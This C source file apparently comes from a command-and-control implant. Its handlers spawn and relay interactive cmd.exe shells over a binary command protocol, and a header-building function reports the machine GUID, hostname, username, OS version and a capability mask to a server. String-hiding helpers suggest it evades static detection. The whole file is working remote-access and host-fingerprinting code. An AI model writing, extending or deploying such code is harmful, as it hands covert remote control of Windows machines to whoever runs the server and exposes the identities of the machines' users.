#include "commands.h"
#include "system_facts.h"
#include "wire.h"
#include "stackstrings.h"

static UINT32 GetCommandCorrelationId(PCHAR command, USIZE commandLength)
{
    if (commandLength < 5)
        return 0;
    return ReadU32LE((const unsigned char *)command, 1);
}

VOID Handle_OpenShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context){
    UINT32 corr_id = GetCommandCorrelationId(command, commandLength);
    unsigned char *reply = (unsigned char *)*response;
    int id = shell_open(context->shells);

    if (id < 0) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);

        MemoryCopy(reply, status_error, sizeof(status_error));
        *responseLength = sizeof(status_error);
        
        LOG_ERROR("OpenShell failed - replied status 1 (corr=%u)", corr_id);
        return;
    }

    int pos = 0;
    WriteU32LE(reply, &pos, STATUS_OK);
    WriteU32LE(reply, &pos, corr_id);
    WriteU64LE(reply, &pos, (unsigned long long)id);

    *responseLength = 16;
    LOG_INFO("Shell with ID %d opened (cmd.exe spawned)", id);
    return;
}

VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context){
    UINT32 corr_id = GetCommandCorrelationId(command, commandLength);
    unsigned char *reply = (unsigned char *)*response;
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | (UINT8)command[i];

    shell_slot *slot = shell_lookup(context->shells, id);

    int status = STATUS_ERROR;
    if (slot) {
        USIZE end = commandLength;
        while (end > 13 && command[end - 1] == '\0')
            end--;
        if (end > 13 && shell_write(slot, command + 13, (DWORD)(end - 13)) == 0)
            status = STATUS_OK;
    }

    int pos = 0;
    WriteU32LE(reply, &pos, (DWORD)status);
    WriteU32LE(reply, &pos, corr_id);
    *responseLength = 8;
    LOG_INFO("Write to shell %u: %lu byte(s)", (UINT32)id, (unsigned long)(commandLength - 13));
}

VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context){
    UINT32 corr_id = GetCommandCorrelationId(command, commandLength);
    unsigned char *reply = (unsigned char *)*response;
        unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | (UINT8)command[i];

    shell_slot *slot = shell_lookup(context->shells, id);
    if (!slot) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));

        *responseLength = sizeof(status_error);
        LOG_ERROR("Read shell with ID %u - unknown ID, replied status 1 (corr=%u)", (UINT32)id, corr_id);
        return;
    }

    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
    DWORD got = 0;
    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);

    if (r == SHELL_READ_DEAD) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        int pos = 4;
        WriteU32LE(status_error, &pos, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *responseLength = sizeof(status_error);

        LOG_ERROR("Shell %llu exited - status 1, slot freed (corr=%u)", id, corr_id);
        return;
    }

    int pos = 0;
    WriteU32LE(chunk, &pos, STATUS_OK);
    WriteU32LE(chunk, &pos, corr_id);

    chunk[8 + got] = '\0';
    MemoryCopy(reply, chunk, 8 + got + 1);

    *responseLength = 8 + got + 1;

    if (r == SHELL_READ_IDLE)
        LOG_INFO("Read shell with ID %u - idle", (UINT32)id);
    else
        LOG_INFO("Read shell with ID %u - %lu byte(s)", (UINT32)id, (unsigned long)got);

    return;
}

VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context){
    UINT32 corr_id = GetCommandCorrelationId(command, commandLength);
    unsigned char *reply = (unsigned char *)*response;
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | (UINT8)command[i];

    shell_slot *slot = shell_lookup(context->shells, id);
    if (slot) {
        shell_teardown(slot);
        LOG_INFO("Shell with ID %u closed (cmd.exe terminated)", (UINT32)id);
    } else {
        LOG_INFO("Close shell with ID %u - not open (still ok)", (UINT32)id);
    }

    int pos = 0;
    WriteU32LE(reply, &pos, STATUS_OK);
    WriteU32LE(reply, &pos, corr_id);
    *responseLength = 8;
}


static const CHAR *SanitizedHeaderValue(const CHAR *value, CHAR *out, USIZE outCapacity)
{
    USIZE i = 0;
    while (i + 1 < outCapacity && value[i] != '\0') {
        unsigned char ch = (unsigned char)value[i];
        out[i] = (ch < 0x20 || ch == 0x7F) ? '_' : value[i];
        i++;
    }
    out[i] = '\0';
    return out;
}

static VOID WriteHeaderNewline(hwriter *writer)
{
    CHAR newline[3];
    BuildHeaderNewline(newline);
    WriteText(writer, newline);
}

USIZE Handle_IdentityHeadersCommand(CHAR headers[IDENTITY_HEADERS_SIZE], const CHAR *sessionKey)
{
    hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
    CHAR piece[64];
    CHAR arch[16];

    BuildApiVersionHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteDecimal(&w, AGENT_API_VERSION);
    WriteHeaderNewline(&w);

    CHAR guid_text[40];
    if (read_machine_guid_text(guid_text)) {
        BuildDeviceIdHeaderPrefix(piece);
        WriteText(&w, piece);
        WriteText(&w, guid_text);
        WriteHeaderNewline(&w);
    }

    if (sessionKey != NULL && sessionKey[0] != '\0') {
        CHAR sessionId[128];
        BuildSessionIdHeaderPrefix(piece);
        WriteText(&w, piece);
        WriteText(&w, SanitizedHeaderValue(sessionKey, sessionId, sizeof(sessionId)));
        WriteHeaderNewline(&w);
    }

    system_facts facts;
    collect_system_facts(&facts);

    CHAR value[ID_HOSTNAME_SIZE];
    if (facts.hostname[0] != '\0') {
        BuildDeviceNameHeaderPrefix(piece);
        WriteText(&w, piece);
        WriteText(&w, SanitizedHeaderValue(facts.hostname, value, sizeof(value)));
        WriteHeaderNewline(&w);
    }

    if (facts.username[0] != '\0') {
        BuildUserIdHeaderPrefix(piece);
        WriteText(&w, piece);
        WriteText(&w, SanitizedHeaderValue(facts.username, value, sizeof(value)));
        WriteHeaderNewline(&w);
    }

    BuildArchitectureName(arch);
    BuildDeviceArchitectureHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteText(&w, arch);
    WriteHeaderNewline(&w);

    BuildAppArchitectureHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteText(&w, arch);
    WriteHeaderNewline(&w);

    BuildPlatformHeader(piece);
    WriteText(&w, piece);
    WriteHeaderNewline(&w);

    BuildClientFeaturesHeaderPrefix(piece);
    WriteText(&w, piece);

    CapabilityMask mask = BuildCapabilityMask();
    CHAR hex[17];
    BuildHexDigits(hex);
    for (USIZE i = 0; w.ok && i < CAPABILITY_MASK_BYTES; i++) {
        unsigned char val = mask.Bits[i];
        CHAR byte[3] = {
            hex[val >> 4],
            hex[val & 0xF],
            '\0'
        };
        WriteText(&w, byte);
    }
    WriteHeaderNewline(&w);

    BuildOsVersionHeaderPrefix(piece);
    if (facts.os_version[0] != '\0') {
        WriteText(&w, piece);
        WriteText(&w, facts.os_version);
        WriteHeaderNewline(&w);
    }

    BuildOsBuildHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteDecimal(&w, (UINT32)ID_BUILD_NUMBER);
    WriteHeaderNewline(&w);

    BuildClientCommitHeaderPrefix(piece);
    BuildDefaultCommitHash(piece + 24);
    WriteText(&w, piece);
    WriteText(&w, piece + 24);
    WriteHeaderNewline(&w);

    BuildClientIdHeaderPrefix(piece);
    WriteText(&w, piece);
    WriteDecimal(&w, AGENT_NAME_ID);
    WriteHeaderNewline(&w);

    if (!w.ok)
        return 0;

    if (w.cur >= w.end)
        return 0;
    *w.cur = '\0';
    return (USIZE)(w.cur - headers);
}
